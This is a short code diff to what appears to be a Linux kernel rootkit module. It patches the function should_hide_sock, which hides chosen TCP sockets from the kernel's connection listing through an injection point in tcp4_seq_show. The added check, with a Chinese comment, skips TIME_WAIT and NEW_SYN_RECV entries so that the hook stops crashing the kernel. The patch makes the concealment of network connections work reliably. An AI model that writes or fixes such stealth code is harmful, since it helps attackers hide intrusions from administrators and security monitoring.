@@ -53,6 +53,17 @@ static bool should_hide_sock(struct sock *sk)
     if ((unsigned long)sk < 0x1000)
         return false;
 
+    /*
+     * tcp4_seq_show 的 ehash 链表会包含 TCP_TIME_WAIT / TCP_NEW_SYN_RECV
+     * 条目，它们只有 struct sock_common（sk_state 可读），没有完整的
+     * struct sock 字段。我们的注入点位于 tcp4_seq_show 的状态分发之前，
+     * 若继续读 sk->sk_socket / sk->sk_callback_lock 会越界访问已释放/复用
+     * 的内存（LIST_POISON dead000000000122）→ 内核 panic 黑屏重启。
+     * 这里先按 sk_state 排除这两种非完整 sock 条目。
+     */
+    if (sk->sk_state == TCP_TIME_WAIT || sk->sk_state == TCP_NEW_SYN_RECV)
+        return false;
+
     if (caller_should_see_hidden())
         return false;
 
